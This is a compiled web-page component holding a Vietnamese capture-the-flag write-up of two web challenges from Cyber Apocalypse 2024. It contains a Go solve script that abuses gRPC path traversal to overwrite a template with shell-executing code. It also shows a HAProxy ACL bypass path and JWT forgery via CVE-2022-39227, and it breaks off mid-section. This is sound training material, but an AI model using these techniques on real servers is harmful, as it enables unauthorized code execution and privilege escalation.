import { _ as _export_sfc, r as resolveComponent, c as createElementBlock, e as createBaseVNode, a as createStaticVNode, b as createVNode, f as createTextVNode, o as openBlock } from "./app-BJjiZhLy.js";
const _imports_0 = "/assets/cyber-apocalypse-2024-DuYV85g7.png";
const _imports_1 = "/assets/cyber-apocalypse-2024-1-6LEOrW37.png";
const _imports_2 = "/assets/cyber-apocalypse-2024-2-CvynAyV4.png";
const _imports_3 = "/assets/cyber-apocalypse-2024-3-CW-PpPkM.png";
const _imports_4 = "/assets/cyber-apocalypse-2024-4-DwCDJrSM.png";
const _imports_5 = "/assets/cyber-apocalypse-2024-5-Bj3Xsn3s.png";
const _imports_6 = "/assets/cyber-apocalypse-2024-6-CoDZxcYh.png";
const _imports_7 = "/assets/cyber-apocalypse-2024-7-BVDZa7Sh.png";
const _imports_8 = "/assets/cyber-apocalypse-2024-8-CtSI7DyC.png";
const _imports_9 = "/assets/cyber-apocalypse-2024-9-BCNVD9hV.png";
const _imports_10 = "/assets/cyber-apocalypse-2024-10-CixWgyLZ.png";
const _imports_11 = "/assets/cyber-apocalypse-2024-11-D-_ZIcMM.png";
const _sfc_main = {};
const _hoisted_1 = { class: "custom-container info" };
const _hoisted_2 = {
  href: "https://uithcm-my.sharepoint.com/:u:/g/personal/23520385_ms_uit_edu_vn/ERI23X926BlGnfBSuAzRm3cBpgayVeZHktM_NKip2LdEaA?e=3SujLE",
  target: "_blank",
  rel: "noopener noreferrer"
};
const _hoisted_3 = { class: "custom-container info" };
const _hoisted_4 = {
  href: "https://uithcm-my.sharepoint.com/:u:/g/personal/23520385_ms_uit_edu_vn/EfSRFaWRkXhMqhSZrQQYtnEBA3tblkQuYSktpQsAY1dH8Q?e=eaFMJk",
  target: "_blank",
  rel: "noopener noreferrer"
};
const _hoisted_5 = {
  href: "https://www.cvedetails.com/cve/CVE-2023-45539/",
  target: "_blank",
  rel: "noopener noreferrer"
};
const _hoisted_6 = {
  href: "https://pypi.org/project/python-jwt/",
  target: "_blank",
  rel: "noopener noreferrer"
};
const _hoisted_7 = {
  href: "https://nvd.nist.gov/vuln/detail/CVE-2022-39227",
  target: "_blank",
  rel: "noopener noreferrer"
};
const _hoisted_8 = {
  href: "https://github.com/davedoesdev/python-jwt/commit/88ad9e67c53aa5f7c43ec4aa52ed34b7930068c9",
  target: "_blank",
  rel: "noopener noreferrer"
};
const _hoisted_9 = {
  href: "https://github.com/user0x1337/CVE-2022-39227",
  target: "_blank",
  rel: "noopener noreferrer"
};
const _hoisted_10 = {
  href: "https://btlfry.gitlab.io/notes/posts/memcached-command-injections-at-pylibmc/",
  target: "_blank",
  rel: "noopener noreferrer"
};
function _sfc_render(_ctx, _cache) {
  const _component_ExternalLinkIcon = resolveComponent("ExternalLinkIcon");
  return openBlock(), createElementBlock("div", null, [
    _cache[28] || (_cache[28] = createBaseVNode("h2", {
      id: "web-testimonial",
      tabindex: "-1"
    }, [
      createBaseVNode("a", {
        class: "header-anchor",
        href: "#web-testimonial"
      }, [
        createBaseVNode("span", null, "WEB: testimonial")
      ])
    ], -1)),
    createBaseVNode("div", _hoisted_1, [
      _cache[1] || (_cache[1] = createStaticVNode('<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"></circle><path d="M12 8h.01"></path><path d="M11 12h1v4h1"></path></g></svg><p class="custom-container-title">Challenge</p><p>As the leader of the Revivalists you are determined to take down the KORP, you and the best of your faction&#39;s hackers have set out to deface the official KORP website to send them a message that the revolution is closing in.</p>', 3)),
      createBaseVNode("p", null, [
        createBaseVNode("a", _hoisted_2, [
          _cache[0] || (_cache[0] = createBaseVNode("code", null, "üìÅ testimonial.zip", -1)),
          createVNode(_component_ExternalLinkIcon)
        ])
      ])
    ]),
    _cache[29] || (_cache[29] = createStaticVNode('<ul><li>B√†i cho ch√∫ng ta web ƒë∆°n gi·∫£n, cho ph√©p l∆∞u c√°c note v√†o folder c·ªßa server. <img src="' + _imports_0 + '" alt="image"></li><li>File flag n·∫±m ·ªü <code>/</code> v√† ƒë∆∞·ª£c ƒë·∫∑t t√™n random</li></ul><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line"><span class="token comment"># Change flag name</span></span>\n<span class="line"><span class="token function">mv</span> /flag.txt /flag<span class="token variable"><span class="token variable">$(</span><span class="token function">cat</span> /dev/urandom <span class="token operator">|</span> <span class="token function">tr</span> <span class="token parameter variable">-cd</span> <span class="token string">&quot;a-f0-9&quot;</span> <span class="token operator">|</span> <span class="token function">head</span> <span class="token parameter variable">-c</span> <span class="token number">10</span><span class="token variable">)</span></span>.txt</span>\n<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>Server s·ª≠ d·ª•ng gRPC ƒë·ªÉ x·ª≠ l√Ω logic</li><li>Code ƒë∆∞·ª£c ch·∫°y v·ªõi <code>Air</code> - live reload for Go apps. C·ª• th·ªÉ h∆°n ƒë·ªëi v·ªõi app n√†y l√† t·ª± reload c√°c file &quot;tpl&quot;, &quot;tmpl&quot;, &quot;templ&quot;, &quot;html&quot;</li></ul><p>Khi submit m·ªôt note m·ªõi, 2 params ƒë∆∞·ª£c truy·ªÅn v√†o l√† <code>customer</code> v√† <code>testimonial</code>. V·ªõi <code>customer</code> l√† t√™n file ƒë∆∞·ª£c l∆∞u v√†o <code>public/testimonials/</code> v√† <code>testimonial</code> l√† n·ªôi dung file.</p><div class="language-javascript line-numbers-mode" data-highlighter="prismjs" data-ext="js" data-title="js"><pre><code><span class="line">func <span class="token function">HandleHomeIndex</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> error <span class="token punctuation">{</span></span>\n<span class="line">    <span class="token literal-property property">customer</span> <span class="token operator">:</span><span class="token operator">=</span> r<span class="token punctuation">.</span><span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">Query</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">&quot;customer&quot;</span><span class="token punctuation">)</span></span>\n<span class="line">    <span class="token literal-property property">testimonial</span> <span class="token operator">:</span><span class="token operator">=</span> r<span class="token punctuation">.</span><span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">Query</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">&quot;testimonial&quot;</span><span class="token punctuation">)</span></span>\n<span class="line">    </span>\n<span class="line">    <span class="token operator">...</span></span>\n<span class="line"></span>\n<span class="line">    <span class="token keyword">if</span> <span class="token literal-property property">err</span> <span class="token operator">:</span><span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">SendTestimonial</span><span class="token punctuation">(</span>customer<span class="token punctuation">,</span> testimonial<span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> nil <span class="token punctuation">{</span></span>\n<span class="line">        http<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> err<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> http<span class="token punctuation">.</span>StatusInternalServerError<span class="token punctuation">)</span></span>\n<span class="line">	<span class="token punctuation">}</span></span>\n<span class="line">    <span class="token punctuation">}</span></span>\n<span class="line">    <span class="token operator">...</span></span>\n<span class="line"><span class="token punctuation">}</span></span>\n<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>Hai param ƒë∆∞·ª£c truy·ªÅn v√†o h√†m <code>SendTestimonial</code>. Th√¥ng qua h√†m n√†y, t√™n file ƒë√£ b·ªã filter v√† lo·∫°i b·ªè t·∫•t c·∫£ c√°c k√≠ t·ª± c√≥ h·∫°i --&gt; Kh√¥ng th·ªÉ pathtraversal ƒë·ªÉ ghi ƒë√® file ƒë∆∞·ª£c.</p><div class="language-javascript line-numbers-mode" data-highlighter="prismjs" data-ext="js" data-title="js"><pre><code><span class="line"><span class="token function">func</span> <span class="token punctuation">(</span>c <span class="token operator">*</span>Client<span class="token punctuation">)</span> <span class="token function">SendTestimonial</span><span class="token punctuation">(</span>customer<span class="token punctuation">,</span> testimonial string<span class="token punctuation">)</span> error <span class="token punctuation">{</span></span>\n<span class="line">    <span class="token operator">...</span></span>\n<span class="line">    <span class="token keyword">for</span> _<span class="token punctuation">,</span> <span class="token literal-property property">char</span> <span class="token operator">:</span><span class="token operator">=</span> range <span class="token punctuation">[</span><span class="token punctuation">]</span>string<span class="token punctuation">{</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;\\\\&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;:&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;*&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;?&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;\\&quot;&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;&lt;&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;&gt;&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;|&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;.&quot;</span><span class="token punctuation">}</span> <span class="token punctuation">{</span></span>\n<span class="line">        customer <span class="token operator">=</span> strings<span class="token punctuation">.</span><span class="token function">ReplaceAll</span><span class="token punctuation">(</span>customer<span class="token punctuation">,</span> char<span class="token punctuation">,</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">)</span></span>\n<span class="line">    <span class="token punctuation">}</span></span>\n<span class="line"></span>\n<span class="line">    _<span class="token punctuation">,</span> <span class="token literal-property property">err</span> <span class="token operator">:</span><span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">SubmitTestimonial</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pb<span class="token punctuation">.</span>TestimonialSubmission<span class="token punctuation">{</span><span class="token literal-property property">Customer</span><span class="token operator">:</span> customer<span class="token punctuation">,</span> <span class="token literal-property property">Testimonial</span><span class="token operator">:</span> testimonial<span class="token punctuation">}</span><span class="token punctuation">)</span></span>\n<span class="line">    <span class="token operator">...</span></span>\n<span class="line"><span class="token punctuation">}</span></span>\n<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>Tuy nhi√™n, ƒë√≥ ch·ªâ l√† nh·ªØng ƒëo·∫°n code ƒë·ªÉ x·ª≠ l√Ω ·ªü ph√≠a client. ƒêo·∫°n code x·ª≠ l√Ω ch√≠nh c·ªßa server v·ªõi gRPC l·∫°i kh√¥ng c√≥ b·∫•t k√¨ bi·ªán ph√°p ph√≤ng ch·ªëng n√†o.</p><div class="language-javascript line-numbers-mode" data-highlighter="prismjs" data-ext="js" data-title="js"><pre><code><span class="line"><span class="token function">func</span> <span class="token punctuation">(</span>s <span class="token operator">*</span>server<span class="token punctuation">)</span> <span class="token function">SubmitTestimonial</span><span class="token punctuation">(</span>ctx context<span class="token punctuation">.</span>Context<span class="token punctuation">,</span> req <span class="token operator">*</span>pb<span class="token punctuation">.</span>TestimonialSubmission<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token operator">*</span>pb<span class="token punctuation">.</span>GenericReply<span class="token punctuation">,</span> error<span class="token punctuation">)</span> <span class="token punctuation">{</span></span>\n<span class="line">    <span class="token operator">...</span></span>\n<span class="line">    <span class="token literal-property property">err</span> <span class="token operator">:</span><span class="token operator">=</span> os<span class="token punctuation">.</span><span class="token function">WriteFile</span><span class="token punctuation">(</span>fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">&quot;public/testimonials/%s&quot;</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span>Customer<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>Testimonial<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0644</span><span class="token punctuation">)</span></span>\n<span class="line">    <span class="token operator">...</span></span>\n<span class="line"><span class="token punctuation">}</span></span>\n<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>C√≥ th·ªÉ th·∫•y, code format <code>req.Customer</code> v√† write file m√† kh√¥ng h·ªÅ ki·ªÉm tra c√°c k√≠ t·ª± x·∫•u. N·∫øu ta c√≥ th·ªÉ g·ªçi th·∫≥ng ƒë·∫øn gRPC server m√† kh√¥ng c·∫ßn th√¥ng qua c√°c b∆∞·ªõc x·ª≠ l√Ω r∆∞·ªùm r√† th√¨ c√≥ th·ªÉ write file m·ªõi, hay ghi ƒë√® file c≈© m·ªôt c√°ch d·ªÖ d√†ng.</p><p>Nh∆∞ v·∫≠y, h∆∞·ªõng ƒëi l√† t·∫°o m·ªôt gRPC client m·ªõi, connect ƒë·∫øn gRPC server v√† SubmitTestimonial, ghi ƒë√® file <code>view/home/index.templ</code>, khi file b·ªã thay ƒë·ªïi, app c≈©ng s·∫Ω reload ƒë·ªÉ c·∫≠p nh·∫≠t n·ªôi d·ª•ng m·ªõi c·ªßa file.</p><p>T·∫°o file <code>index.tmpl</code> m·ªõi thay th·∫ø cho n·ªôi dung file c≈© ƒë·ªÉ ƒë·ªçc flag</p><details class="custom-container details"><summary class="custom-container-title">index.tmpl</summary><div class="language-templ line-numbers-mode" data-highlighter="prismjs" data-ext="templ" data-title="templ"><pre><code><span class="line">package home</span>\n<span class="line"></span>\n<span class="line">import (</span>\n<span class="line">    &quot;fmt&quot;</span>\n<span class="line">    &quot;os/exec&quot;</span>\n<span class="line">)</span>\n<span class="line"></span>\n<span class="line">func getFlag() string {</span>\n<span class="line">    cmd := exec.Command(&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;cat /flag*.txt&quot;)</span>\n<span class="line">    out, err := cmd.Output()</span>\n<span class="line">    if err != nil {</span>\n<span class="line">        return &quot;Error&quot;</span>\n<span class="line">    }</span>\n<span class="line">    return string(out)</span>\n<span class="line">}</span>\n<span class="line"></span>\n<span class="line">templ Index() {</span>\n<span class="line">    {getFlag()}</span>\n<span class="line">}</span>\n<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><p>T·∫°o gRPC client, submit testimonial ƒë·ªÉ ghi ƒë√® file c√≥ s·∫µn v·ªõi pathtraversal, m√¨nh d·ª±a v√†o src g·ªëc ƒë·ªÉ t·∫°o gRPC client</p><details class="custom-container details"><summary class="custom-container-title">solve.go</summary><div class="language-go line-numbers-mode" data-highlighter="prismjs" data-ext="go" data-title="go"><pre><code><span class="line"><span class="token keyword">package</span> main</span>\n<span class="line"></span>\n<span class="line"><span class="token keyword">import</span> <span class="token punctuation">(</span></span>\n<span class="line">    <span class="token string">&quot;fmt&quot;</span></span>\n<span class="line">    <span class="token string">&quot;htbchal/client&quot;</span></span>\n<span class="line">    <span class="token string">&quot;log&quot;</span></span>\n<span class="line">    <span class="token string">&quot;os&quot;</span></span>\n<span class="line"><span class="token punctuation">)</span></span>\n<span class="line"></span>\n<span class="line"><span class="token keyword">func</span> <span class="token function">HandleHomeIndex</span><span class="token punctuation">(</span>customer<span class="token punctuation">,</span> testimonial <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>\n<span class="line">    <span class="token keyword">if</span> customer <span class="token operator">!=</span> <span class="token string">&quot;&quot;</span> <span class="token operator">&amp;&amp;</span> testimonial <span class="token operator">!=</span> <span class="token string">&quot;&quot;</span> <span class="token punctuation">{</span></span>\n<span class="line">        c<span class="token punctuation">,</span> err <span class="token operator">:=</span> client<span class="token punctuation">.</span><span class="token function">GetClient</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span>\n<span class="line">        <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span></span>\n<span class="line">            log<span class="token punctuation">.</span><span class="token function">Fatalf</span><span class="token punctuation">(</span><span class="token string">&quot;Error getting client: %v&quot;</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span></span>\n<span class="line">        <span class="token punctuation">}</span></span>\n<span class="line"></span>\n<span class="line">        <span class="token keyword">if</span> err <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">SendTestimonial</span><span class="token punctuation">(</span>customer<span class="token punctuation">,</span> testimonial<span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span></span>\n<span class="line">            log<span class="token punctuation">.</span><span class="token function">Fatalf</span><span class="token punctuation">(</span><span class="token string">&quot;Error sending testimonial: %v&quot;</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span></span>\n<span class="line">        <span class="token punctuation">}</span></span>\n<span class="line">    <span class="token punctuation">}</span></span>\n<span class="line"><span class="token punctuation">}</span></span>\n<span class="line"></span>\n<span class="line"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>\n<span class="line">    dat<span class="token punctuation">,</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">ReadFile</span><span class="token punctuation">(</span><span class="token string">&quot;newhome.templ&quot;</span><span class="token punctuation">)</span></span>\n<span class="line">    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span></span>\n<span class="line">        log<span class="token punctuation">.</span><span class="token function">Fatalf</span><span class="token punctuation">(</span><span class="token string">&quot;Error reading file: %v&quot;</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span></span>\n<span class="line">    <span class="token punctuation">}</span></span>\n<span class="line"></span>\n<span class="line">    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">&quot;Submitting testimonial...&quot;</span><span class="token punctuation">)</span></span>\n<span class="line">    <span class="token function">HandleHomeIndex</span><span class="token punctuation">(</span><span class="token string">&quot;../../view/home/index.templ&quot;</span><span class="token punctuation">,</span> <span class="token function">string</span><span class="token punctuation">(</span>dat<span class="token punctuation">)</span><span class="token punctuation">)</span></span>\n<span class="line"><span class="token punctuation">}</span></span>\n<span class="line"></span>\n<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><p>Ch·ªâ c·∫ßn ch·∫°y file <code>solve.go</code> ƒë·ªÉ submit testimonial l√™n cho server, sau ƒë√≥ reload l·∫°i trang v√† l·∫•y flag</p><h2 id="web-locktalk" tabindex="-1"><a class="header-anchor" href="#web-locktalk"><span>WEB: Locktalk</span></a></h2>', 17)),
    createBaseVNode("div", _hoisted_3, [
      _cache[3] || (_cache[3] = createStaticVNode('<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"></circle><path d="M12 8h.01"></path><path d="M11 12h1v4h1"></path></g></svg><p class="custom-container-title">Challenge</p><p>In &quot;The Ransomware Dystopia,&quot; LockTalk ...(sh1t)... against the encroaching darkness.</p>', 3)),
      createBaseVNode("p", null, [
        createBaseVNode("a", _hoisted_4, [
          _cache[2] || (_cache[2] = createBaseVNode("code", null, "üìÅ web_locktalk.zip", -1)),
          createVNode(_component_ExternalLinkIcon)
        ])
      ])
    ]),
    _cache[30] || (_cache[30] = createStaticVNode('<ul><li>App cho 3 API Endpoints <img src="' + _imports_1 + '" alt="image"> C√≥ hai endpoint quan tr·ªçng l√† <code>get_ticket</code> ƒë·ªÉ l·∫•y jwt token v√† <code>flag</code> ƒë·ªÉ l·∫•y flag d·ª±a v√†o jwt token.</li></ul><div class="language-python line-numbers-mode" data-highlighter="prismjs" data-ext="py" data-title="py"><pre><code><span class="line"><span class="token decorator annotation punctuation">@api_blueprint<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">&#39;/get_ticket&#39;</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">&#39;GET&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span></span>\n<span class="line"><span class="token keyword">def</span> <span class="token function">get_ticket</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></span>\n<span class="line">    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></span>\n<span class="line">    claims <span class="token operator">=</span> <span class="token punctuation">{</span></span>\n<span class="line">        <span class="token string">&quot;role&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;guest&quot;</span><span class="token punctuation">,</span></span>\n<span class="line">        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></span>\n<span class="line">    <span class="token punctuation">}</span></span>\n<span class="line">    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></span>\n<span class="line">    </span>\n<span class="line"><span class="token decorator annotation punctuation">@api_blueprint<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">&#39;/flag&#39;</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">&#39;GET&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span></span>\n<span class="line"><span class="token decorator annotation punctuation">@authorize_roles</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">&#39;administrator&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span></span>\n<span class="line"><span class="token keyword">def</span> <span class="token function">flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></span>\n<span class="line">    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></span>\n<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>ƒê·ªÉ l·∫•y ƒë∆∞·ª£c flag th√¨ y√™u c·∫ßu jwt token ph·∫£i c√≥ role l√† <code>administrators</code>, tuy nhi√™n token ƒë∆∞·ª£c generate ra t·ª´ <code>/get_ticket</code> l√† <code>guest</code>. V·∫≠y ph·∫£i faki jwt ƒë·ªÉ l·∫•y ƒë∆∞·ª£c flag.</p><p>Tuy nhi√™n, khi GET <code>/api/v1/get_ticket</code> l·∫°i b·ªã <strong>403 Forbidden</strong>, ban ƒë·∫ßu m√¨nh kh√¥ng ƒë·ªçc kƒ© n√™n kh√¥ng ƒë·ªÉ √Ω app s·ª≠ d·ª•ng haproxy. Ng√≥ qua config c·ªßa haproxy th√¨ th·∫•y nh∆∞ sau</p><div class="language-config line-numbers-mode" data-highlighter="prismjs" data-ext="config" data-title="config"><pre><code><span class="line">frontend haproxy</span>\n<span class="line">    bind 0.0.0.0:1337</span>\n<span class="line">    default_backend backend</span>\n<span class="line"></span>\n<span class="line">    http-request deny if { path_beg,url_dec -i /api/v1/get_ticket }</span>\n<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>khi GET ƒë·∫øn th√¨ s·∫Ω b·ªã proxy ch·∫∑n l·∫°i, ACL ki·ªÉm tra n·∫øu url b·∫Øt ƒë·∫ßu v·ªõi <code>/api/v1/get_ticket</code> th√¨ ch·∫∑n l·∫°i, ta c√≥ th·ªÉ bypass b·∫±ng c√°ch GET <code>/api/v1/../v1/get_ticket</code>.</p>', 6)),
    createBaseVNode("blockquote", null, [
      _cache[6] || (_cache[6] = createBaseVNode("p", null, [
        createTextVNode("Ngo√†i ra c√≥ th·ªÉ bypass v·ªõi "),
        createBaseVNode("code", null, "//api/v1/get_ticket"),
        createTextVNode(" (shin24)")
      ], -1)),
      createBaseVNode("p", null, [
        _cache[5] || (_cache[5] = createTextVNode("Ho·∫∑c d·ª±a v√†o haproxy version hi·ªán t·∫°i l√† 2.8.1, b·ªã d√≠nh l·ªó h·ªïng b·∫£o m·∫≠t ")),
        createBaseVNode("a", _hoisted_5, [
          _cache[4] || (_cache[4] = createTextVNode("CVE-2023-45539")),
          createVNode(_component_ExternalLinkIcon)
        ])
      ])
    ]),
    createBaseVNode("p", null, [
      _cache[9] || (_cache[9] = createBaseVNode("img", {
        src: _imports_2,
        alt: "image"
      }, null, -1)),
      _cache[10] || (_cache[10] = createTextVNode(" ƒê√£ c√≥ jwt v·ªõi role l√† ")),
      _cache[11] || (_cache[11] = createBaseVNode("code", null, "guest", -1)),
      _cache[12] || (_cache[12] = createTextVNode(", ta c·∫ßn t√¨m c√°ch edit jwt ƒë·ªÉ c√≥ th·ªÉ ch·ªânh th√†nh ")),
      _cache[13] || (_cache[13] = createBaseVNode("code", null, "admin", -1)),
      _cache[14] || (_cache[14] = createTextVNode(". M√† ·ªü ƒë√¢y app s·ª≠ d·ª•ng ")),
      createBaseVNode("a", _hoisted_6, [
        _cache[7] || (_cache[7] = createTextVNode("python-jwt v3.3.3")),
        createVNode(_component_ExternalLinkIcon)
      ]),
      _cache[15] || (_cache[15] = createTextVNode(" ƒë·ªÉ x·ª≠ l√Ω jwt. ƒê√¢y c≈©ng l√† m·ªôt phi√™n b·∫£n c≈© v√† b·ªã d√≠nh l·ªó h·ªïng b·∫£o m·∫≠t ")),
      createBaseVNode("a", _hoisted_7, [
        _cache[8] || (_cache[8] = createTextVNode("CVE-2022-39227")),
        createVNode(_component_ExternalLinkIcon)
      ]),
      _cache[16] || (_cache[16] = createTextVNode(" cho ph√©p ta ch·ªânh s·ª≠a, gi·∫£ m·∫°o jwt m·ªõi v·ªõi sign c≈©."))
    ]),
    _cache[31] || (_cache[31] = createBaseVNode("p", null, [
      createTextVNode("ƒê·∫øn ƒë√¢y ta ch·ªâ c·∫ßn d·ª±a v√†o CVE-2022-39227 ch·ªânh s·ª≠a jwt token t·ª´ role "),
      createBaseVNode("code", null, "guest"),
      createTextVNode(" th√†nh "),
      createBaseVNode("code", null, "administrators"),
      createTextVNode(" v√† GET "),
      createBaseVNode("code", null, "/api/v1/flag"),
      createTextVNode(" v·ªõi jwt token ƒë·ªÉ l·∫•y flag.")
    ], -1)),
    _cache[32] || (_cache[32] = createBaseVNode("h3", {
      id: "ve-cve-2022-39227",
      tabindex: "-1"
    }, [
      createBaseVNode("a", {
        class: "header-anchor",
        href: "#ve-cve-2022-39227"
      }, [
        createBaseVNode("span", null, "V·ªÅ CVE-2022-39227")
      ])
    ], -1)),
    createBaseVNode("p", null, [
      _cache[18] || (_cache[18] = createBaseVNode("code", null, "python-jwt", -1)),
      _cache[19] || (_cache[19] = createTextVNode(" sau ƒë√≥ ƒë√£ c·∫≠p nh·∫≠t l√™n v3.3.4 ƒë·ªÉ fix l·ªói (")),
      createBaseVNode("a", _hoisted_8, [
        _cache[17] || (_cache[17] = createTextVNode("#88ad9e6")),
        createVNode(_component_ExternalLinkIcon)
      ]),
      _cache[20] || (_cache[20] = createTextVNode("), c·ª• th·ªÉ th√™m h√†m ƒë·ªÉ check jwt format ")),
      _cache[21] || (_cache[21] = createBaseVNode("img", {
        src: _imports_3,
        alt: "image"
      }, null, -1)),
